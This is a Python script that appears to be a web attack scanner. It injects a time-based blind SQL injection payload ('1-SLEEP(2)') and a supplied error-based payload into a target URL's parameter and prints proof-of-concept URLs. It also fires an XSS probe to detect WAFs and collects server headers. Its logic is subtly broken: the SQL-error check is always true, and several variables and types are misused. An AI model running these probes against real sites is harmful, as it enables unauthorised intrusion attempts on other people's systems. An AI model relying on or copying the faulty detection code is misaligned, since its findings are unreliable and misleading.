

#xss
#sql
#lfi
#xst
#waf

import requests
import sys
import time


def sql_(url,payLoad):
    p1=[]
    p2=[]
    p3=[]
    print("\n[!] Testing SQLi")
    urlt = url.split("=")
    urlt = urlt[0] + '='
    urlb = urlt + '1-SLEEP(2)'

    time1 = time.time()
    req = requests.get(urlb)
    time2 = time.time()
    timet = time2 - time1
    timet = str(timet)
    timet = timet.split(".")
    timet = timet[0]
    if int(timet) >= 2:
        print("[*] Blind SQL injection time based found!")
        print("[!] Payload:",'1-SLEEP(2)')
        print("[!] POC:",urlb)
        p1.append('[*] Blind SQL injection time based found!, [!] Payload: 1-SLEEP(2), [!] POC:'+urlb)
    else:
        p1.append("[!] SQL time based failed.")
        print("[!] SQL time based failed.")


    payload1 =payLoad
    urlq = urlt + payload1
    reqqq = requests.get(urlq).text
    if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' or 'error in your SQL syntax' \
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
            or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in reqqq:
        print("\n[*] SQL Error found.")
        print("[!] Payload:",payload1)
        print("[!] POC:",urlq)
        p2.append('[*] SQL Error found., [!] Payload:'+payload1+', [!] POC:'+urlq)
    else:
        pass

    return p1,p2

def checkwaf(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with statu code:", sc.status_code)
            return "[!] Error with statu code:", sc.status_code
    except:
        print("[!] Error with the first request.")
        return "[!] Error with the first request."
        exit()
    r = requests.get(url)

    opt = ["Yes","yes","Y","y"]
    try:
        if r.headers["server"] == "cloudflare":
            print("[\033[1;31m!\033[0;0m]The Server is Behind a CloudFlare Server.")
            # ex = input("[\033[1;31m!\033[0;0m]Exit y/n: ")
            if ex in opt:
                exit("[\033[1;33m!\033[0;0m] - Quitting")
            return "[\033[1;31m!\033[0;0m]The Server is Behind a CloudFlare Server."
    except:
        pass

    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    waffd = requests.get(fuzz)
    if waffd.status_code == 406 or waffd.status_code == 501:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    if waffd.status_code == 999:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    if waffd.status_code == 419:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    if waffd.status_code == 403:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
        return "[\033[1;31m!\033[0;0m] WAF Detected."
    else:
        print("[*] No WAF Detected.")
        return "[*] No WAF Detected."
def header(url):
    h = requests.get(url)
    he = h.headers
    p=[]

    try:
        print("Server:",he['server'])
        p.append("Server:"+he['server'])
        # return "Server:"+he['server']
    except:
        pass
    # try:
    #     print("Data:",he['date'])
    #     p.append("Data:"+he['date'])
    #     # return "Data:"+he['date']
    # except:
    #     pass
    try:
        print("Powered:",he['x-powered-by'])
        p.append("Powered:"+he['x-powered-by'])
        # return "Powered:"+he['x-powered-by']
    except:
        pass
    return p
    
def banner(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with statu code:",sc.status_code)
            return "[!] Error with statu code:"+sc.status_code

    except:
        print("[!] Error with the first request.")
        return "[!] Error with the first request."


# def help():
#     print("""
#
#
#     error: try different website
#     python3 sql.py http://example.com/page.php?id=value
#     """)
#     exit()
#
# try:
#     arvs = sys.argv
#     url = arvs[1]
# except:
#     help()
#
# if 'http' not in url:
#     help()
# if '?' not in url:
#     help()
#
# timing1 = time.time()
# checkwaf(url)
# banner(url)
# header(url)
# sql_(url)
#
# timing2 = time.time()
# timet = timing2 - timing1
# timet = str(timet)
# timet = timet.split(".")
# print("\n[!] Time used:",timet[0],"seconds.\n")
